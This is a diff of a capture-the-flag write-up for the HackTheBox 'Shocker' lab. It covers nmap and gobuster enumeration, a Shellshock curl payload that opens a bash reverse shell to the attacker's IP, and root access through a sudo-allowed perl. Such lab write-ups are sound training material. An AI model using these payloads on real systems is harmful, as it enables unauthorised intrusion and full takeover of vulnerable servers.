@@ -13,17 +13,20 @@ Jumping in with Nmap then...
 
 `nmap -sV -Pn 10.10.10.56 |tee -a shock.txt`
 
-{% highlight ruby %}
+```
+
 PORT     STATE SERVICE VERSION
 80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
 2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-{% endhighlight %}
+
+```
 
 Unusual to find ssh on a port other than 22, a bit of security through obscurity perhaps, it may mean that it is somehow otherwise vulnerable.
 Lets check out this possibility with nmap...
 
-{% highlight ruby %}
+```
+
 root@kali:~/HTB/prep/shocker# nmap -sSV 10.10.10.56 --script=vuln |tee -a shock.txt 
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-09 18:40 GMT
 Nmap scan report for 10.10.10.56
@@ -51,13 +54,15 @@ PORT     STATE SERVICE VERSION
 |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
 2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-{% endhighlight %}
+
+```
 
 Nothing immediately apparent, and nikto on the webport 80 gives nothing.
 
 gobuster finds /cgi-bin with a common.txt scan...we'll scan again looking for scripts...
 
-{% highlight ruby %}
+```
+
 root@kali:~/HTB/retired# gobuster dir -u http://10.10.10.56/cgi-bin/ -w /root/wordlists/SecLists/Discovery/Web-Content/common.txt -x .sh,.txt,.php
 ===============================================================
 Gobuster v3.0.1
@@ -89,23 +94,28 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 2020/02/16 18:19:33 Finished
 ===============================================================
-{% endhighlight %}
+
+```
 
 /user.sh needs to be looked at...
 
-{% highlight ruby %}
+```
+
 Content-Type: text/plain
 
 Just an uptime test script
 
  18:24:12 up 54 min,  0 users,  load average: 0.01, 0.00, 0.00
-{% endhighlight %}
+
+```
 
 Well, nothing usefull in itself, but what it does mean (cgi-bin accessible), is that this installation of Apache may well be vulnerable to a Shellshock exploit.
 
-{% highlight ruby %}
+```
+
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.34/6969 0>&1' http://10.10.10.56/cgi-bin/user.sh
-{% endhighlight %}
+
+```
 
 This attempt works straight off the bat...Google Shellshock if you need to find out what it is...Its an important vulnerability to know about.
 [Wiki on shellshock](https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29)
@@ -114,7 +124,8 @@ This attempt works straight off the bat...Google Shellshock if you need to find 
 
 So we got user shell on the target...
 
-{% highlight ruby %}
+```
+
 shelly@Shocker:/home/shelly$ sudo -l
 sudo -l
 Matching Defaults entries for shelly on Shocker:
@@ -123,12 +134,14 @@ Matching Defaults entries for shelly on Shocker:
 
 User shelly may run the following commands on Shocker:
     (root) NOPASSWD: /usr/bin/perl
-{% endhighlight %}
+
+```
 
 sudo -l is always one of the first commands I try when I get an user shell, for this sort of reason.
 Getting root now is very simple.
 
-{% highlight ruby %}
+```
+
 shelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e 'exec "/bin/bash";'
 sudo /usr/bin/perl -e 'exec "/bin/bash";'
 id
@@ -141,8 +154,8 @@ cat user.txt
 2exxxxxxxxxxxxxxxxxxxxxxxxxxxx33
 cat /root/root.txt
 5xxxxxxxxxxxxxxxxxxxxxxxxxxxxx67
-{% endhighlight %}
 
+```
 
 ###########################################
 
